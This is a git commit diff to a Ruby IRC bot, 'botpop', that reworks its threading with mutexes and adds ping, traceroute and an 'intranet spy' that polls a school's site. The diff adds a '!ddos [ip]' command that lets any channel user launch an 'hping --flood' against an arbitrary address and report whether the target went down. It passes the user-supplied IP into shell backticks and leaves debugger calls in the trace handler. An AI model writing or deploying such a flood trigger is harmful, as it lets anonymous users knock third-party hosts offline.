d44b518205f5ae4a3c0c33a3f89b2d3701b89224
Arthur Poulet <arthur.poulet@cryptolab.net>
2015-05-01 16:17:12 +0200

    Large improvment
    - Use natives thread of cinch
    - Add mutex to lock the heavy actions
    - add ddos
    - fix security flow ??

--- botpop.rb
+++ botpop.rb
@@ -34,6 +34,10 @@ def get_msg m
   URI.encode(m.params[1..-1].join(' ').gsub(/\![^ ]+ /, ''))
 end
 
+def get_ip m
+  m.params[1..-1].join(' ').gsub(/\![^ ]+ /, '').gsub(/[^[:alnum:]\-\_\.]/, '')
+end
+
 def help m
   m.reply "!cmds, !help, !version, !ddos [ip], !ping, !ping [ip], !code, !intra, !intra [on/off], #{SEARCH_ENGINES_KEYS}"
 end
@@ -46,7 +50,11 @@ bot = Cinch::Bot.new do
     else
       c.server = "irc.freenode.org"
       c.port = 7000
-      c.channels = ["#equilibres"]
+      if ARGV[0] == "debug"
+        c.channels = ["#equilibres"]
+      else
+        c.channels = ["#equilibre"]
+      end
       c.ssl.use = true
     end
 
@@ -71,21 +79,6 @@ bot = Cinch::Bot.new do
     m.reply VERSION
   end
 
-  on :message, /!ddos #{TARGET}\Z/ do |m|
-    ip = get_msg m
-    m.reply "I am not allowed to ddos #{ip}"
-  end
-
-  on :message, /!ping #{TARGET}\Z/ do |m|
-    ip = get_msg m
-    p = Net::Ping::External.new ip
-    str = "failed"
-    if p.ping?
-      str = "#{(p.duration*100.0).round 2}ms (#{p.host})"
-    end
-    m.reply "#{ip} ping> #{str}"
-  end
-
   on :message, "!code" do |m|
     m.reply "https://github.com/pouleta/botpop"
   end
@@ -95,31 +88,84 @@ bot = Cinch::Bot.new do
   end
 
   on :message, "!intra on" do |m|
-    if @intra.nil?
-      @intra = Thread.new {
+    @intra ||= Mutex.new
+    if @intra.try_lock
+      begin
         m.reply "INTRANET SPY ON"
+        @intra_on = true
         sleep 1
         loop do
+          break if @intra_on == false
           m.reply Net::Ping::External.new("intra.epitech.eu").ping? ? "Intra ok" : "Intra down"
-          sleep 30
+          sleep 3
         end
-      }
+        @intra.unlock
+      rescue
+        @intra.unlock
+      end
     else
       m.reply "INTRA SPY ALREADY ON"
     end
   end
 
   on :message, "!intra off" do |m|
-    if @intra
-      m.reply "INTRANET SPY OFF"
-      @intra.terminate
-      @intra.join
-      @intra = nil
-    end
+    @intra_on = false
+    m.reply "INTRA SPY OFF"
   end
 
   on :message, "!ping" do |m|
     m.reply "#{m.user} pong"
+  end
+
+  on :message, /!ping #{TARGET}\Z/ do |m|
+    ip = get_ip m
+    p = Net::Ping::External.new ip
+    str = "failed"
+    if p.ping?
+      str = "#{(p.duration*100.0).round 2}ms (#{p.host})"
+    end
+    m.reply "#{ip} ping> #{str}"
+  end
+
+  on :message, /!ddos #{TARGET}\Z/ do |m|
+    @ddos ||= Mutex.new
+    if @ddos.try_lock
+      begin
+        ip = get_ip m
+        m.reply "Begin attack against #{ip}"
+        s = `timeout 1s hping --flood '#{ip}' 2>&1`
+        s = s.split("\n")[3].to_s
+        m.reply (Net::Ping::External.new(ip).ping? ? "failed :(" : "down !!!") + " " + s
+        @ddos.unlock
+      rescue
+        @ddos.unlock
+      end
+    else
+      m.reply "Wait for the end of the last ddos"
+    end
+  end
+
+  on :message, /!trace #{TARGET}\Z/ do |m|
+    @trace ||= Mutex.new
+    if @trace.try_lock
+      begin
+        ip = get_ip m
+        m.reply "It can take time"
+        s = `tracepath '#{ip}'`.to_s.split("\n")
+        binding.pry
+        if s.include? {|e| e.include? "Too many hops" }
+          m.reply "Cannot reach the host"
+        end
+        so = s.select{|e| not e.include? "no reply" and e =~ /\A \d+: .+/}
+        binding.pry
+        @trace.unlock
+        s.each{|l| m.reply l; sleep 0.5}
+      rescue # in error case
+        @trace.unlock
+      end
+    else
+      m.reply "Please retry after when the last trace end"
+    end
   end
 
   on :message, "!cmds" do |m|
